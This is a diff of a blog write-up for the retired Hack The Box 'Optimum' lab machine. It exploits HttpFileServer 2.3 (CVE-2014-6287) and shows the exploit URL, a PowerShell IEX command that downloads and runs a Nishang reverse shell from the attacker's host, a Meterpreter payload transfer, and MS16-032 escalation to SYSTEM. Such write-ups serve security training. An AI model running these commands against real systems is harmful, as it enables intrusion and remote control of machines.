@@ -2,7 +2,7 @@
 title: "Hack The Box: Optimum"
 date: 2026-08-29
 ref: WU-006
-summary: "Rooting the retired HTB 'Optimum' machine — exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain an initial foothold as a low-privileged user, then escalating to SYSTEM via a Windows kernel privilege escalation exploit."
+summary: "Rooting the retired HTB 'Optimum' machine — exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain an initial foothold as a low-privileged user, then escalating to SYSTEM via two separate Windows kernel privilege escalation exploits."
 tags: [hack-the-box, hfs, http-file-server, windows, rce, cve-2014-6287, privilege-escalation, Metasploit, wes-ng, sherlock, ms16-032, cve-2019-1458]
 ---
 
@@ -12,7 +12,7 @@ tags: [hack-the-box, hfs, http-file-server, windows, rce, cve-2014-6287, privile
   <img src="{{ '/assets/img/htb-optimum/Optimum_Logo.png' | relative_url }}" width="300"/>
 </p>
 
-**Description:** Optimum is an easy-rated Windows machine on Hack The Box focused on exploiting a vulnerable file server and Windows kernel privilege escalation. The attack path involves exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain initial access as a low-privileged user, followed by escalating to SYSTEM using a local privilege escalation exploit against a partially patched but outdated Windows Server 2012 R2 Standard build.
+**Description:** Optimum is an easy-rated Windows machine on Hack The Box focused on exploiting a vulnerable file server and Windows kernel privilege escalation. The attack path involves exploiting a remote code execution vulnerability in HttpFileServer 2.3 to gain initial access as a low-privileged user, followed by escalating to SYSTEM using two seperate local privilege escalation exploits against a partially patched but outdated Windows Server 2012 R2 Standard build.
 
 
 **Retired machine — `optimum.htb`**
@@ -24,7 +24,7 @@ tags: [hack-the-box, hfs, http-file-server, windows, rce, cve-2014-6287, privile
 **Credentials:** 
 Kotas's users credentials discovered in WinPeas output.
 ```
-Kotas:kdeEjDowkS*
+kotas:kdeEjDowkS*
 ```
 
 **Nmap**
@@ -58,7 +58,7 @@ Nmap done: 1 IP address (1 host up) scanned in 16.67 seconds
 ---
 ### Enumeration
 
-We begin the machine using our Scripts and Services scan and find just one port open. This makes things quite straightforward for us, as we only need to investigate one active service at this time. From the version information returned, we can see that port 80 is running `HttpFileServer httpd 2.3`, which gives us the answer to 'Guided Mode' task one's question.
+We begin the machine by using Nmap our Scripts and Services scan and find just one port open. This makes things quite straightforward for us, as we only need to investigate one active service at this time. From the version information returned, we can see that port 80 is running `HttpFileServer httpd 2.3`, which gives us the answer to 'Guided Mode' task one's question.
 
 ```bash
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
@@ -83,7 +83,7 @@ We can start by opening a browser of our choice (Firefox in this case, as it's K
 
 After clicking around a little and attempting some common password guesses, we can check whether there are any default credentials associated with the service. A quick search on Google gives us a strong indication that there are no default credentials available, so there's little more to gain from this approach and we should move on.
 
-Working with what we have, we now know the exact version of the web application, so let's use `searchsploit` and search for the exact string provided in the server information. Our search for `HttpFileServer 2.3` proves fruitful, as we find a matching exploit for an unauthenticated Remote Code Execution (RCE) vulnerability.
+Working with what we have, we now know the exact version of the web application, so let's use `searchsploit` and search for the exact string provided in the server information. Our search for `HttpFileServer 2.3` proves fruitful, as we find a matching exploit for an unauthenticated **Remote Code Execution (RCE)** vulnerability.
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
 └─$ searchsploit HttpFileServer 2.3         
@@ -95,14 +95,14 @@ Rejetto HttpFileServer 2.3.x - RCE (3)                  | windows/webapps/49125.
 Shellcodes: No Results
 ```
 
-If this works, we should be able to obtain a session on the target. However, it would be foolish to simply fire the exploit off without first understanding how and why it works. In the next section, we'll break down the attack vector, make any revisions required to the script if it's required, and then attempt to use the exploit we've discovered.
+If our discovery is correct, we should be able to obtain a session on the target without needing any credentials. However, it would be foolish to simply fire the exploit off without first understanding how and why it works. In the next section, we'll break down the attack vector, make any revisions required to the script (if it's required), and then attempt to use the exploit we've matched against the service.
 
 ---
 ### Remote Code Execution (CVE-2014-6287)
 
 Attempting to understand the exploit gives us a good learning opportunity here. By breaking down the inner workings of the discovered Python script, we can understand what it's doing before modifying the command arguments to tailor it to our requirements.
 
-We can use `searchsploit -x windows/webapps/49125.py` to inspect the script's contents before copying or using it. The results show us a Python 3 script, meaning we won't need to do any porting, and the exploit is immediately usable in its current state. We can also find the answer to Guided Mode Task Two's question within the comments, which identify the CVE designation associated with the exploit.
+We can use `searchsploit -x windows/webapps/49125.py` to inspect the script's contents before copying or using it. The results show us a Python 3 script, meaning we won't need to do any porting, and the exploit is immediately usable in its current state. We can also find the answer to 'Guided Mode' task two's question within the comments, which identifies the CVE designation associated with the exploit.
 {% raw %}
 ```Python
 # Exploit Title: Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)
@@ -137,7 +137,7 @@ except Exception as ex:
 ```
 {% endraw %}
 
-Inspecting the script gives us a few clues about how it works, what arguments it expects, and how we might chain its functionality together to gain a shell on the system. To reinforce our understanding, we can first read through the code and try to understand what it's doing (see the full explanation below for those who want a more detailed breakdown). From there, we can manually test the vulnerability before firing the final reverse shell payload.
+Inspecting the script gives us a few clues about how it works, what arguments it expects, and how we might chain its functionality together to gain a shell on the system. To reinforce our understanding, let's first read through the code and try to understand what it's doing (see the full explanation below for those who want a more detailed breakdown). From there, we can manually test the vulnerability before firing the final reverse shell payload.
 
 > **How `49125.py` works?**
 > 
@@ -155,8 +155,8 @@ Looking at the URL string, there are a few concepts we need to understand before
 
 1. We see `{sys.argv[x]}` within the string, where `x` represents the argument being inserted into the constructed URL based on the values supplied to the script (`RHOST`, `RPORT`, and the command). If we're going to test this manually, we'll need to replace these with the corresponding values we would otherwise provide to the script.
 2. Because we're using [CyberChef](https://gchq.github.io/CyberChef), we need to be careful with the null byte `%00`. When URL decoded, this represents a NUL byte rather than the literal word `null`. We need to keep the `%00` intact when constructing our payload, otherwise the exploit won't work correctly.
-3. We'll use the script's example to call `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe` and then run a quick ping to test the functionality. We could simply call `cmd`, but using PowerShell gives us an opportunity to test whether we can execute commands through PowerShell. This will become useful later on.
-4. The double curly braces `{{` and `}}` in the f-string are Python's way of escaping literal `{` and `}` characters. When the URL is actually constructed, these become single braces, so we'll need to account for this when manually recreating the payload.
+3. We'll use the script's example to call `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe` and then run a quick ping to test the functionality. We could simply call Command Prompt (cmd), but using PowerShell gives us an opportunity to test whether we can execute commands through PowerShell. This will become useful later on.
+4. The double curly braces {{ and }} in the f-string are Python's way of escaping literal `{` and `}` characters. When the URL is actually constructed, these become single braces, so we'll need to account for this when manually recreating the payload.
 ![RCE DecodeURL]({{ '/assets/img/htb-optimum/Optimum_RCE_DecodeURL.png' | relative_url }})
 
 We can now edit the string to include the variables and corrections discussed above.
@@ -164,7 +164,7 @@ We can now edit the string to include the variables and corrections discussed ab
 - First, we enter Optimum's IP address, `10.129.54.27`, replacing `{sys.argv[1]}`.
 - Next, we replace `{sys.argv[2]}` with the port `80`. This isn't strictly necessary in this instance because HTTP is running on its default port, but it helps demonstrate how the argument is being passed to the script and reinforces our understanding of how it works.
 - Next, we'll use `c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping -n 3 10.10.14.62` as our command argument.
-- Finally, we can strip out the double curly braces `{{` and `}}` used by Python's f-string to escape literal braces. These aren't required in our manually constructed URL and would otherwise cause the request to fail.
+- Finally, we can strip out the double curly braces {{ and }} used by Python's f-string to escape literal braces. These aren't required in our manually constructed URL and would otherwise cause the request to fail.
 
 The result will look something like the example below. We've now constructed the URL, but it's not quite ready to send yet.
 
@@ -172,7 +172,7 @@ The result will look something like the example below. We've now constructed the
 http://10.129.54.27:80/?search=%00{. exec|c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe ping -n 3 10.10.14.62.}
 ```
 
-Before we copy and paste the string into Firefox's address bar, we should URL-encode the payload. This ensures that the special characters required by the exploit are correctly represented during transmission and aren't interpreted or altered by the browser or web server. Encoding the payload also helps preserve its integrity and is generally good practice when working with specially constructed URLs.
+Before we copy and paste the string into Firefoxs address bar, we should URL-encode the payload. This ensures that the special characters required by the exploit are correctly represented during transmission and aren't interpreted or altered by the browser or web server. Encoding the payload also helps preserve its integrity and is generally good practice when working with specially constructed URLs.
 
 > **Why URL encode payloads?**
 > 
@@ -182,7 +182,7 @@ Before we copy and paste the string into Firefox's address bar, we should URL-en
 > 
 > It is best practice to URL encode any payload before embedding it in a request, even when characters _appear_ safe — proxies, WAFs, and application parsers all handle raw special characters inconsistently. Encoding ensures the payload arrives exactly as constructed.
 
-In our case, we can use CyberChef's URL Encode operation. Comparing the input and output helps us understand exactly what has been changed and reinforces what we've learned so far about how special characters are represented within the URL.
+In our case, we can use CyberChef's **URL Encode** operation. Comparing the input and output helps us understand exactly what has been changed and is a working example of what we've learned so far about how special characters are represented within the URL.
 ![RCE EncodeURL]({{ '/assets/img/htb-optimum/Optimum_RCE_EncodeURL.png' | relative_url }})
 
 For the final step, we'll use `sudo tcpdump -i tun0 icmp` to capture any incoming ICMP traffic. Once the capture is running, we can send the encoded URL request using the browser's address bar and watch for the results.
@@ -195,7 +195,7 @@ Now that everything is working as expected and we've covered the relevant theory
 ---
 ### Shell as Kostas (Initial Access)
 
-With our payload delivery working, we can now turn the Rejetto HttpFileServer 2.3.x RCE exploit into actual access to the system. Before doing so, we'll grab the Nishang framework and its collection of PowerShell scripts. We can then use one of these scripts in combination with the `49125.py` exploit to deliver our reverse shell and establish a foothold on the target.
+With our payload delivery working, we can now turn the **Rejetto HttpFileServer 2.3.x RCE** exploit into actual access to the system. Before doing so, we'll grab the **Nishang** framework and its collection of PowerShell scripts. We can then use one of these scripts in combination with the `49125.py` exploit to deliver our reverse shell and establish a foothold on the target.
 
 > **Warning — Legacy tools**
 > 
@@ -262,7 +262,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 Everything is now ready and we can send the payload. We'll use `exploit.py` to achieve RCE, then use PowerShell with an `IEX` expression to create a WebClient instance that downloads and executes `rev.ps1`. This is our Nishang `Invoke-PowerShellTcpOneLine` reverse shell script.
 
-Once the process completes, we land a session on the machine as the 'kostas' user. We now have an actual foothold on the system, and this also gives us the answer to 'Guided Mode' task three's question.
+Once the process completes, we land a session on the machine as the `kostas` user. We now have an actual foothold on the system, and this also gives us the answer to 'Guided Mode' task three's question.
 ``` Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/Exploit]
 └─$ python3 exploit.py 10.129.54.27 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.62/rev.ps1')"
@@ -287,7 +287,7 @@ optimum\kostas <-- Task 3
 
 #### Obtaining the User Flag
 
-As we've now landed on the system, we might as well grab the user flag while we're here. We can use the `dir` command to list the files located on Kostas' desktop. Sure enough, we find the first flag, which we can inspect using the `type` command.
+As we've now landed on the system, we might as well grab the user flag while we're here. We can use the `dir` command to list the files located on kostas' desktop. Sure enough, we find the first flag, which we can inspect using the `type` command.
 
 ```PowerShell
 PS C:\Users\kostas\Desktop> dir
@@ -306,7 +306,7 @@ PS C:\Users\kostas\Desktop> type user.txt
 [user flag redacted]
 ```
 
-In this case, we can also see `hfs.exe`, which is the application being run by the `Kostas` user. This helps explain why our shell has landed in a standard user context rather than an IIS service account. I suspect this was a deliberate choice by the creator, as landing directly as `IIS APPPOOL\DefaultAppPool` on Windows Server 2012 R2 could have made the next stage considerably easier for an attacker looking to gain full administrative access.
+In this case, we can also see `hfs.exe`, which is the application being run by the `kostas` user. This helps explain why our shell has landed in a standard user context rather than an IIS service account. We suspect this was a deliberate choice by the creator, as landing directly as `IIS APPPOOL\DefaultAppPool` on Windows Server 2012 R2 could have made the next stage considerably easier for an attacker looking to gain full administrative access.
 
 As an IIS service account, a shell running in this context would typically inherit **`SeImpersonatePrivilege`**, which can provide a relatively straightforward route towards privilege escalation. On Build 9600, which we'll identify in the next section, this privilege can potentially be abused using tools such as **Juicy Potato**. Instead, we're currently sitting in the `Kostas` user context, meaning we'll need to do some more digging to find our route towards `SYSTEM`.
 
@@ -315,7 +315,7 @@ As an IIS service account, a shell running in this context would typically inher
 
 Our first priority before running any additional scripts should be to understand the system and its architecture. Only once we have a better picture of what we're working with should we start running enumeration scripts or looking for potential privilege escalation exploits.
 
-Ahead, we'll first address the issue of unstable shell execution caused by the way our current session handles processes. From there, we'll approach privilege escalation from two different angles, demonstrating both automated and manual methods for identifying exploits that may be suitable for the system.
+Ahead, we'll first address an issue of unstable shell execution caused by the way our current session handles processes. From there, we'll approach privilege escalation from two different angles, demonstrating both automated and manual methods for both identifying and deploying exploits that may be suitable for the system.
 
 To start, we can run the `systeminfo` command. This will not only confirm the operating system version and build number, but also show us that the system is x64-based. This is an important piece of information that will become useful several times throughout the privilege escalation process.
 ```PowerShell
@@ -415,7 +415,7 @@ We could spend a long time fumbling around the system, running the odd command h
 └─$ cp /usr/share/peass/winpeas/winPEASx64.exe pea.exe
 ```
 
-We change directory to `Documents`, purely because writing files here would be less suspicious if this were a real user environment. From there, we use the shorthand `Invoke-WebRequest` (`IWR`) command to download the x64 version of WinPEAS onto the system.
+We change directory to `Documents`, purely because writing files here would be less suspicious if this were a real user environment. From there, we use the shorthand `Invoke-WebRequest` with the `IWR` command to download the x64 version of WinPEAS onto the system.
 
 We then attempt to run the executable from our current shell environment, but the session hangs almost immediately. This effectively leaves our shell unusable and means we'll need to investigate why the session is behaving this way before we can continue with our enumeration.
 ```PowerShell
@@ -435,7 +435,7 @@ PS C:\Users\kostas\Documents> ./pea.exe
 
 We'll need to reset the shell and figure out a way around this behaviour if we want the script to run correctly. We can use `Ctrl + C` to terminate the current session, allowing us to start the process again and try a different approach.
 
-This gives us another very important lesson that we've seen in previous walkthroughs: **not all shells are built the same!**
+This highlights a very important lesson about understanding our tools and that not all shells are built the same.
 
 > **Note — Shell Limitations and Restrictions**
 > 
@@ -464,7 +464,7 @@ lport => 443
 [*] Started reverse TCP handler on 10.10.14.62:443 
 ```
 
-We reopen our initial session using the CVE-2014-6287 exploit, giving us a way back onto the system. From there, we can transfer our newly generated Meterpreter payload onto the machine. Once the binary has been transferred, we execute it and receive a reverse connection back to our listener, giving us a more capable session to work with.
+We reopen our initial session using the **CVE-2014-6287** exploit, giving us a way back onto the system. From there, we can transfer our newly generated Meterpreter payload onto the machine. Once the binary has been transferred, we execute it and receive a reverse connection back to our listener, giving us a more capable session to work with.
 ``` PowerShell
 PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/met.exe -Outfile met.exe
 
@@ -499,7 +499,7 @@ dir
 C:\Users\kostas\Documents>pea.exe
 ```
 
-This time, we have no issues at all and get a large amount of information to sift through. Unfortunately, we don't find anything immediately useful in terms of privilege escalation. We do, however, find the answer to Guided Mode Task Five's question in the form of some auto-logon credentials for the 'kostas' user.
+This time, we have no issues at all and get a large amount of information to sift through. Unfortunately, we don't find anything immediately useful in terms of privilege escalation. We do, however, find the answer to 'Guided Mode' task five's question in the form of some auto-logon credentials for the 'kostas' user.
 ```Shell
 ����������͹ AV Information
   [X] Exception: Invalid namespace 
@@ -825,7 +825,7 @@ Exploit  Scans  Sherlock.ps1
 PS C:\Users\kostas\Documents> iwr -uri http://10.10.14.62/Sherlock.ps1 -Outfile Sherlock.ps1
 ```
 
-We attempt to run `Sherlock.ps1` from our newly created `rev.exe` shell to avoid the issues we encountered previously. Unfortunately, the result is another frozen and unresponsive shell. This is becoming very frustrating, so we'll make one final attempt to get the tool working before considering whether it's time to ditch it and move on.
+We attempt to run `Sherlock.ps1` from our newly created `rev.exe` shell to avoid the issues we encountered previously. Unfortunately, the result is another frozen and unresponsive shell. This becomes very frustrating, so we'll make one final attempt to get the tool working before considering whether it's time to ditch it and move on.
 
 ``` Powershell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
@@ -842,8 +842,7 @@ Copyright (C) 2014 Microsoft Corporation. All rights reserved.
 
 PS C:\Users\kostas\Documents> ./Sherlock.ps1
 ```
-
-Out of desperation, we run the tool from our original Nishang shell environment. Surprisingly, after giving it some time, Sherlock eventually completes and provides us with the output we were looking for. This gives us another useful example of how manual enumeration could have been approached at the time, with Sherlock being a relevant tool for identifying potential privilege escalation opportunities on a system of this age.
+Out of desperation, we run the tool from our original Nishang shell environment. Surprisingly, after giving it some time, Sherlock eventually completes and provides us with the output we were looking for. Getting the script working and sticking with it turns out to be the right move, as it gives us useful insight into how manual enumeration could have been approached at the time. Sherlock was a relevant tool for identifying potential privilege escalation opportunities on a system of this age, making it a valuable part of the enumeration process.
 ```Powershell
 PS C:\Users\kostas\Documents> ./Sherlock.ps1 
 
@@ -920,11 +919,9 @@ The above is probably going to leave some readers a little confused about our ea
 
 The research below helps answer that question, with the TL;DR being: **neither is inherently better.** This is exactly why we do CTFs and experiments. We learn by understanding why things fail, how different tools behave in different environments, and which approach is appropriate for the job at hand.
 
-Your tools are only as useful as your understanding of how to use them. We should always be asking ourselves: **what is the right tool for the environment we're currently working in?**
-
 > **Shell Stability Differences**
 > 
-> This might look like a contradiction — earlier in this post, switching from the Nishang shell to the compiled reverse shell exe fixed a hang with LinPEAS/WinPEAS. Here, it's the opposite: the exe shell hangs and the Nishang shell doesn't.
+> This might look like a contradiction — earlier in the walkthrought, switching from the Nishang shell to the compiled reverse shell exe fixed a hang with LinPEAS/WinPEAS. Here, it's the opposite: the exe shell hangs and the Nishang shell doesn't.
 > 
 > The reason is that these two payloads aren't just "different shells," they're built completely differently under the hood:
 > * The Nishang shell is a single PowerShell process using .NET's TcpClient directly for socket I/O. It has no subprocess or pipe relay in between — PowerShell talks straight to the socket.
@@ -938,7 +935,7 @@ Your tools are only as useful as your understanding of how to use them. We shoul
 
 We can also reuse a solution we discovered during our previous walkthrough of the _Devel_ machine. There, we found a simple script that allows us to save the output of `systeminfo` to a file and perform the vulnerability checks locally on our Kali machine. As we've already covered how this works [here](https://hackopotamus.github.io/portfolio/writeups/2026-07-25-htb-devel/), we won't spend too much time going over the setup again. Instead, we'll simply run it and sample some of the results.
 
-We copy the output from our earlier `systeminfo` command into `systeminfo.txt`, update the script as required, and then run it locally. The results give us a plethora of potential exploits, so we've filtered the output below to focus only on the two candidates we selected earlier.
+We copy the output from our earlier `systeminfo` command into `systeminfo.txt`, update the script as required, and then run it locally. The results give us a plethora of potential exploits, so the ouput below has been filtered to focus only on the two candidates we selected earlier.
 ```Shell
 ┌──(kali㉿kali)-[~/…/Hack The Box/Machines/Optimum/wesng]
 └─$ python3 wes.py systeminfo.txt --impact "Elevation of Privilege"
@@ -979,9 +976,9 @@ Impact: Elevation of Privilege
 Exploits: http://packetstormsecurity.com/files/156651/Microsoft-Windows-WizardOpium-Local-Privilege-Escalation.html, http://packetstormsecurity.com/files/159569/Microsoft-Windows-Uninitialized-Variable-Local-Privilege-Escalation.html, https://exploit-db.com/exploits/48180
 ```
 
-**MS16-032**
+**MS16-032 (Manual)**
 
-To finish, we'll manually exploit one of the vulnerabilities and complete the manual approach to this section. We'll use **MS16-032**, as it appears to be a little more stable than CVE-2019-1458. With that reasoning out of the way, we can focus on sourcing an exploit. We find a suitable candidate [here](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that we can use for this demonstration.
+To finish, we'll exploit one of the vulnerabilities and complete the manual approach to this section. We'll use **MS16-032**, as it appears to be a little more stable than CVE-2019-1458. With that reasoning out of the way, we can focus on sourcing an exploit. We find a suitable candidate [here](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) that we can use for this demonstration.
 
 After downloading and inspecting the exploit, we can see an example of how it can be used near the top of the script. Given the issues we encountered with Sherlock freezing our shell, it seems sensible to take some precautions here as well. We can add a self-call to the bottom of the script, instructing it to execute the `rev.exe` shell we previously transferred to the machine.
 
@@ -1000,10 +997,7 @@ PS C:\Users\kostas\Documents> IEX(New-Object Net.WebClient).downloadstring('http
 
 [!] Holy handle leak Batman, we have a SYSTEM shell!!
 ```
-
-Before doing anything else, we first set up a Netcat listener ready to catch the connection when `rev.exe` is executed again. With `Invoke-MS16032.ps1` edited and saved on our Kali machine, we can then use the same `IEX` command from earlier to download the script from our Python 3 web server and execute it directly in memory.
-
-Once this executes, we receive a callback on our listener and can see that, one final time, we're running in the context of `NT AUTHORITY\SYSTEM`. This completes our manual exploitation process and, once again, gives us full control of the system.
+Once `Invoke-MS16032.ps1` runs, it executes `rev.exe` with elevated privilleges and we receive a callback on our listener. This results in us running in the context of `NT AUTHORITY\SYSTEM` and completes our manual exploitation process. as before it gives us full control of the system allowing us to access the final flag in the next section.
 ```Shell
 ┌──(kali㉿kali)-[~/Documents/Hack The Box/Machines/Optimum]
 └─$ nc -lvnp 1234
